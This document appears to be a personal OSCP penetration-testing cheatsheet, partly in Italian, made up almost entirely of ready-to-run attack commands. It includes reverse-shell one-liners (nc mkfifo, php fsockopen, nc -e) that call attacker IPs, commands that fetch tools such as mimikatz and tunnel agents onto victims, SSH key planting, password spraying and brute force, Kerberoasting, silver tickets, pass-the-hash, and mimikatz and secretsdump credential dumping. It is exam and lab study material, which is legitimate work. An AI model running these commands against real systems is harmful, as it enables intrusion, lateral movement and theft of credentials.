# Cheatsheet

- https://github.com/0xsyr0/OSCP
- https://github.com/BlessedRebuS/OSCP-Pentesting-Cheatsheet/blob/main/README.md
- https://github.com/RubensZimbres/OSCP-best

# SSH 

## ssh-keygen  

```bash  
# Once you have a victim side shell, you can try to create an id_rsa file to access via ssh

# kali
ssh-keygen -f username
# copy the contents of the username.pub file

# victim
cd /.ssh
echo ssh-rsa [CONTENUTO DI username.pub] > authorized_keys

# kali
chmod 600 username
ssh -i username username@$IP
```

- [Example - Magic HTB](https://www.youtube.com/watch?v=bLIcew9Iot8&t=750s&ab_channel=IppSec)

# Payloads

[[Payloads]]
## Linux

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.200 80 >/tmp/f

php -r '\$sock=fsockopen(\”192.168.45.231\”, 8443);exec(\”/bin/sh -i <&3 >&3 2>&3\”);'
```

# Interactive Shells
## Linux

- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

**Fully Interactive TTYs with python**

```bash
which python python2 python3

python -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Fully Interactive TTYs with nc**

```bash
nc $KALI_IP -e /bin/bash
```

**Fully Interactive TTYs with screen**

- Esempio: [HTB Precious](https://0xdf.gitlab.io/2023/05/20/htb-precious.html)

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
Terminal type? screen
```
## Windows

#### ConPtyShell (Fully Interactive Shell)

Su kali:

```bash
git clone https://github.com/antonioCoco/ConPtyShell.git

python -m http.server 9999

stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Su windows:

```bash
powershell iwr -uri http://$KALI_IP:9999/windows/ConPtyShell.exe -Outfile ConPtyShell.exe

certutil -urlcache -split -f "http://$KALI_IP:9999/windows/ConPtyShell.exe" "C:\Users\security\Downloads\ConPtyShell.exe"

powershell C:\windows\temp\ConPtyShell.exe $KALI_IP 3001

powershell .\ConPtyShell.exe $KALI_IP 3001
```

#### Nishang

- https://github.com/samratashok/nishang
- [1 esempio macchina-htb](https://0xdf.gitlab.io/2019/03/02/htb-access.html#shell-via-telnet)
- [2 esempio macchina-htb](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bounty-writeup-w-o-metasploit#id-8ece)


# Linux Toolkit

Su kali:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240519-fab0d0d5/linpeas.sh

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

python3 -m http.server 9999
```

Su linux vittima:

```bash
wget http://$KALI_IP:9999/linux/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

wget http://$KALI_IP:9999/linux/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000
```

# Windows Toolkit

Su kali:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240519-fab0d0d5/winPEASx64.exe

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe

wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1

wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1

wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

python3 -m http.server 9999
```

Su windows:

```bash
iwr -uri http://$KALI_IP:9999/windows/winPEASx64.exe -Outfile winPEAS.exe

iwr -uri http://$KALI_IP:9999/windows/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

iwr -uri http://$KALI_IP:9999/windows/SharpHound.ps1 -Outfile SharpHound.ps1

iwr -uri http://$KALI_IP:9999/windows/PowerView.ps1 -Outfile PowerView.ps1 

iwr -uri http://$KALI_IP:9999/windows/mimikatz.exe -Outfile mimikatz.exe

iwr -uri http://$KALI_IP:9999/windows/mimikatz64.exe -Outfile mimikatz64.exe
```

# Tunneling e Port Forwarding

## Ligolo-ng

- [Guida](https://kentosec.com/2022/01/13/pivoting-through-internal-networks-with-sshuttle-and-ligolo-ng/)

### Tunneling

Su **kali**:

```bash
git clone https://github.com/nicocha30/ligolo-ng.git

cd ligolo-ng

sudo go build -o agent cmd/agent/main.go
sudo go build -o proxy cmd/proxy/main.go

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip

unzip ligolo-ng_agent_0.5.2_windows_amd64.zip
```

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add $SUBNET_TARGET/24 dev ligolo

sudo ./proxy -selfcert
```

Su **linux** vittima:

```bash
wget http://192.168.45.226:9999/ligolo-ng/agent

./agent -connect 192.168.45.226:11601 -ignore-cert
```

Su **windows**:

```bash
iwr -uri http://$KALI_IP:9999/ligolo-ng/agent.exe -Outfile agent.exe

.\agent.exe -connect 192.168.45.175:11601 -ignore-cert
```

### Port Forwarding

```text
Creates a listener on the machine where we're running the agent at port 1234  
and redirects the traffic to port 4444 on our machine.  
You can use other ports, of course.
```

[Guida](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#basics)

```bash
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

### Double Pivoting

- [Ligolo Double-Pivoting](https://systemweakness.com/double-pivoting-for-newbies-with-ligolo-ng-4177b3f1f27b)

## Chisel

- https://github.com/jpillora/chisel

### Port Forwarding

Su **kali**:

```bash
./chisel server --port 5432 --reverse
```

Su **linux** vittima:

```bash
cd /tmp
wget http://192.168.45.190:9999/chisel/chisel

./chisel client 192.168.45.190:5432 R:socks > /dev/null 2>&1 &
./chisel client 10.10.14.4:5432 R:3306:localhost:3306 > /dev/null 2>&1 &
./chisel client 10.10.14.6:8000 R:5432:172.22.0.1:5432
```

Su **windows**:

```bash
powershell iwr -uri http://$KALI_IP:9999/chisel/c.exe -Outfile c.exe

.\c.exe client $KALI_IP:5432 R:8888:localhost:8888
```

## SSH 

### Tunneling

```bash
# Esempio
ssh -L 1234:localhost:8080 amay@10.10.11.28

ssh -L 3000:localhost:3000 malika@192.168.109.110
```

### Dynamic Port Forwarding

```bash
ssh -D 1080 user@10.10.11.28
```

# File transfer

## SCP

Su kali:

```bash
sudo systemctl ssh start
```

Su windows o linux vittima:

```bash
# da vittima a kali
scp path/to/file kali@$KALI_IP:path/to/file

# da kali a vittima
scp kali@$KALI_IP:path/to/file path/to/file

# Esempio
scp sitebackup3.zip kali@192.168.45.214:/home/kali/OSCP/challenge_labs/retake/retake_a_oscp/144/sitebackup3.zip
```

# Active Directory 

- [Mappa AD](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg)
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
## Get users

IMPORTANTE: alcune volte potrebbe essere utile sincronizzare il tempo con il DC!

```bash
sudo ntpdate $DC_IP
```

Se non dovesse funzionare vedere [qui](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069).

- **GetADUsers**

```bash
impacket-GetADUsers -dc-ip $IP "domain.com/" -all 
```

- **nxc** 

```bash
nxc ldap <ip> -u '' -p '' --query "(objectClass=*)" "*"
nxc ldap <ip> -u '' -p '' --query "(objectClass=*)" "*" > ldap_output.txt
cat ldap_output.txt | grep userPrincipalName | awk '{print $6}'

# rid-brute attack
sudo crackmapexec smb $IP -u guest -p "" --rid-brute
sudo crackmapexec  smb 10.10.11.35 -u anonymous -p '' --rid-brute 

nxc smb <ip> --users
```

- **Kerbrute**
 
```bash
kerbrute userenum --dc $IP -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

kerbrute userenum --dc $IP -d domain.com users.txt -o valid_ad_users
```

- **rpcclient**

```bash
rpcclient -U '' -N <ip>
	enumdomusers
	querydispinfo
```

## Got Usernames

**Repeat if any credentials are discovered!**

- **Bruteforce usernames as password**

```bash
nxc smb <ip> -u users.txt -p users.txt --continue-on-succes --no-bruteforce
nxc smb <ip> -u users.txt -p users.txt --continue-on-success 
```

- Provare anche con **winrm**, **rdp** e con il flag `--local-auth`  

- **Asreproasting**

```bash
for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

nxc ldap <ip> -u users.txt -p '' --asreproast output.txt
```

- **Kerbrute**

```bash
kerbrute bruteuser -d domain.com passwords.txt username
```

## Got Credentials

**Repeat if any credentials are discovered!**

 - After getting credentials always enumerate smb shares, ldap, ftp, etc again with the newly gained credentials. Look for description of users in ldap as you might discover credentials for a higher privileged user

**ncx**

```bash
# Get Other Users
nxc smb <ip> -u 'username' -p 'password' --users
nxc smb <ip> -u 'username' -p 'password' --users > nxc_users.txt
cat nxc_users.txt | awk '{print $5}' > u.txt

nxc ldap <ip> -u 'username' -p 'password' --query "(objectClass=*)" "*"

# Reuse password on others users
nxc smb <ip> -u users.txt -p passwords.txt  --continue-on-success
```

- **GetADUsers**

```bash
impacket-GetADUsers -all "domain.com/username" -dc-ip $IP
# inserire password richiesta
```

- **Kerberoasting**

```bash
impacket-GetUserSPNs -dc-ip <ip> domain.com/user -request

impacket-GetUserSPNs oscp.com/username:'password' -dc-ip $IP -debug -outputfile kerberoast.txt
```

- **Kerbrute**

```bash
kerbrute passwordspray -d domain.com users.txt Password123
kerbrute bruteuser -d domain.com passwords.txt username

# con una lista di username e password
cat credentials.txt | kerbrute -d domain.com bruteforce -
```

-  **Bloodhound.py**

```bash
nxc ldap <ip> -u user -p pass --bloodhound -c All -ns <ip>

bloodhound-python -c ALL -u USERNAME -p 'PASSWORD' -d DOMAIN.COM -dc dc01.DOMAIN.COM -ns %IP
```

- **rpcclient**

```bash
rpcclient -U domain.com/user $IP
> enumdomusers
> getdompwinfo
> setuserinfo username 23 'password'
```

- If it is a service account try **Silver Ticket Attack**. I will add an example with MS SQL

```bash
impacket-ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>

# esempio
impacket-ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator

# use ticket to login to the SQL service:
KRB5CCNAME=administrator.ccache mssqlclient.py -k Administrator@dc.sequel.htb

# Enable xp_cmdshell
...
# Ottieni una shell con xp_cmdshell
```

## Got Admin

- After getting admin always use secretsdump

```bash
secretsdump.py domain/user:pass@domain.com
```

- Run mimikatz:
 
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

- Enumerate files manually. Use `tree /F` on `C:\Users` to display all files in the users directory recursively.

## Passord Spraying & PTH

**SMB**

```bash
smbclient -N -L //IP_TARGET/ -U domain.com/user%password
```

**SMB Password Spraying**

```bash
# Meglio utilizzare hydra a quanto pare!

# Vedere NetExec (successore di crackmapexec)

# Utilizzare --local-auth per provare un accesso locale alla macchina

sudo crackmapexec ssh $SUBNET_TARGET/24 -u users.txt -p passwords.txt

sudo netexec ssh $SUBNET_TARGET/24 -u users.txt -p passwords.txt

-u users.txt -p passwords.txt --continue-on-success

-u users.txt -p passwords.txt -d oscp.exam --continue-on-success

-u 'user' -p 'PASS' --rid-brute

-u 'user' -p 'PASS' -d 'oscp.exam' --groups

-u 'user' -p 'PASS' --local-users

-u 'user' -p 'PASS' --lusers

-u 'user' -p 'PASS' --sessions

-u 'Administrator' -p 'PASS' --local-auth --sam

-u 'Administrator' -p 'PASS' --local-auth --shares

-u users.txt -p passwords.txt -d oscp.exam --continue-on-success | grep "[+]"

-u users.txt -p 'Nexus123!' -d oscp.exam --continue-on-success

-u 'Administrator' -p 'PASS' -x whoami --local-auth
```

**SMB Pass-the-hash**

```bash
crackmapexec smb 10.11.1.120-124 -u 'Administrator' -H 'HASH'

--local-auth --lsa

--exec-method smbexec -X 'whoami'

-d oscp.exam -x whoami
```

**SMB command execution**

```bash
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```


**ldap**

```bash
nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users

nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups
```


**MSSQL Passord Spraying**

```bash
sudo crackmapexec mssql 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
```

**Kerbrute**

```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

**RDP**

```bash
xfreerdp /cert-ignore /u:user /p:"Password" /v:$IP_TARGET
xfreerdp /cert-ignore /u:user /d:domain.com /p:"Password" /v:$IP_TARGET

# per avere una cartella condivisa
xfreerdp /cert-ignore /u:user /d:domain.com /p:"Password" /v:$IP_TARGET /size:85% /kbd:0x0000040a +clipboard +drive:smbdfolder,/home/kali/Desktop/Tools
```

**RDP Password Spraying**

```bash
hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://192.168.232.218:3389 -u -vV -T 40 -I

hydra -V -f -L users.txt -P passwords.txt rdp://192.168.232.218 -u -vV -T 40 -I
```

**WinRM**

- https://0xss0rz.gitbook.io/0xss0rz/pentest-htb/windows-1/winrm 

```basH
evil-winrm -i $IP_TARGET -u 'user' -p 'Password'
evil-winrm -i $IP_TARGET -u 'user' -H 'HASH'
```

**WinRM Password Spraying**

```bash
sudo crackmapexec winrm $SUBNET_TARGET/24 -u users.txt -p passwords.txt

--local-auth --continue-on-success 

-x whoami --local-auth

-d exam.oscp --continue-on-success

-d exam.oscp
```

**impacket-psexec**

```basH
impacket-psexec domain.com/user:"password"@$IP

impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.165.21
```

**impacket-wmiexec PTH**

```bash
impacket-wmiexec  -hashes :hash domain.com/user@$IP_TARGET
impacket-wmiexec -hashes :$NTLM_HASH user@$IP_TARGET

# esempio
impacket-wmiexec -hashes :fd1f7e5564060258ea787ddbb6e6afa2 Administrator@172.16.8.3
```

**FTP Password Spraying**

```bash
hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://$IP:21 -u -vV -T 40 -I
```

**SSH Password Spraying**

```bash
hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://$IP:22 -u -vV -T 40 -I
```

## Mimikatz

- https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
- https://github.com/gentilkiwi/mimikatz/wiki
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#execute-commands
- https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz

```bash
# logon password and NTLM hashes
.\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"

# mimikatz one-liner
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "sekurlsa::msv" "lsadump::sam" "sekurlsa::wdigest" "exit"

.\mimikatz.exe  "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"

# SAM & SYSTEM
.\mimikatz.exe "lsadump::sam  /system:C:\windows.old\windows\system32\SYSTEM /sam:C:\windows.old\windows\system32\SAM" "exit"
```

```bash
.\mimikatz
privilege::debug

lsadump::secrets

# provare ad elevare i privilegi
token::elevate
# rilanciare 
lsadump::secrets

# per attacco overpass the Hash
sekurlsa::logonpasswords

# per attacco pass the ticket
sekurlsa::tickets /export

# per attacco golden ticket
lsadump::lsa /patch
```

# Directory Fuzzing

**ffuf**

```bash
# classic
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://$TARGET_IP/FUZZ

# recursive common.txt
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://10.129.230.21/FUZZ -recursion -recursion-depth 3 -e .php -v -fc 403

# recursive directory-list-2.3-medium.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.129.230.21/FUZZ -recursion -recursion-depth 3 -e .php -v -fc 403

# subdomains
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.$TARGET_IP/

# parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -u http://$TARGET_IP/FUZZ

# LFI
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://$TARGET_IP/FUZZ
```

**gobuster**

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET_IP

gobuster dir -x .pdf,.html,.asp,.aspx,.php -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET_IP

# HTTPS
gobuster dir -k -u http://$TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html -r -t 100
```

